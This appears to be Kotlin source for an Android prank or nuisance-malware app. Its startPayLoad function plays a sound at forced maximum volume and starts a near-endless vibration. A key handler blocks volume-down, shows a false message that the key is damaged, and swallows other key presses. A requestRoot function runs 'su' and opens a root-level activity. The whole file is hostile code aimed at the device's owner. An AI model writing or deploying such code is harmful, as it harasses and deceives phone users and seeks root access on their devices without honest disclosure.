package com.wing4merbr.sobs

import android.content.Context
import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.media.MediaPlayer
import android.os.*
import android.view.View
import android.media.AudioManager
import android.view.KeyEvent
import android.widget.Toast

class MainActivity3 : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main3)
    }

     fun startPayLoad(view: View) {
        val macaxera = MediaPlayer.create(this, R.raw.macaxera);
        macaxera.start();
         val manager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        manager.setStreamVolume(AudioManager.STREAM_MUSIC, manager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
         vibrate();
     }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_DOWN -> {
                Toast.makeText(applicationContext, "Vol Down está danificado, entre em contato com a fabricante do seu dispositivo", Toast.LENGTH_LONG).show()
                val manager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                manager.setStreamVolume(AudioManager.STREAM_MUSIC, manager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            }
        }

        return true;
    }

    fun requestRoot(view: View) {
        val process = Runtime.getRuntime().exec("su")
        if (process !== null) {
            Toast.makeText(applicationContext, "Todos aqui nos divertiremos", Toast.LENGTH_LONG).show()
            val intent = Intent(this, RootActivity::class.java)
            startActivity(intent)
        } else {
            Toast.makeText(applicationContext, "CANNOT_ASSUTY_THIS_DEVICE", Toast.LENGTH_LONG).show()
        }
    }
    fun Context.vibrate() {
        val vibrator =
            applicationContext.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator? ?: return

        val pattern = longArrayOf(0, 7200000, 1000)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(
                VibrationEffect.createWaveform(pattern, VibrationEffect.DEFAULT_AMPLITUDE)
            )

        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }
        }
    }
}